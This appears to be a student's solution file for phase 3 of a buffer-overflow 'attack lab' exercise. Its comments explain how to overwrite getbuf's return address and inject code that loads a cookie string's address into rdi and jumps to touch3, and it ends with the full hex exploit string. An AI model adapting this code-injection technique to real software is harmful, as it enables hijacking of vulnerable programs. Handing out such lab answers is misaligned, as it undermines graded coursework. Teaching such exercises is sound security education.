/* similar to phase 2 you should inject exploit code in buf (replace original return address with address of injected code )
using buffer overflow ,so when getbuf returns it would execute injected code rather than return control to test

your exploit string(code) should contain hex representation for your cookie and pointer to this string stored in rdi register
and also address of exploit code to be executed instead of test fun 
when getbuf returns it call touch3 , touch3 call hexmatch() fun and space allocated bu getbuf become free,
then hexmatch may overwrite onto buf space 
so you should write exploit code above return address


IMPORTANT points
When we write to the buffer, we write from lower address to higher
address, and when the object code is read from the program to be executed, it
is also read from lower address to higher address. This is illustrated by the
picture, where for each quadword, the bytes on the right have lower address than
bytes on the left.
Thus, we you input object code generated by "objdump -d" into exploit string,
you do not have to reverse it. However, as x86 system uses little endian,
requiring that the Least Significant Byte occupies the lowest address,
you need to reverse the ordering of a constant(numerical constant,
or address) when you put it into the exploit string.

bit representation for your cookie "59b997fa"
char   ascii in hex
5   =>   35
9   =>   39
b   =>   62
7   =>   37
f   =>   66
a   =>   61

the stack after allocating space in getbuf:
---------------------------
|00 00 00 c3 fa 18 40 00  | 0x5561dcc0
---------------------------
|68 55 61 dc a8 c7 c7 48  | 0x5561dcb8
---------------------------
|00 00 00 00 00 00 00 00  | 0x5561dcb0
---------------------------
|61 66 37 39 39 62 39 35  | 0x5561dca8, the start of the cookie string representation
---------------------------
|00 00 00 00 55 61 dc b8  | 0x5561dca0, return address after calling Gets()
---------------------------
|00 00 00 00 00 00 00 00  |
---------------------------
|00 00 00 00 00 00 00 00  |
---------------------------
|00 00 00 00 00 00 00 00  |
---------------------------
|00 00 00 00 00 00 00 00  |
---------------------------
|00 00 00 00 00 00 00 00  |  
---------------------------
*/

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
b8 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
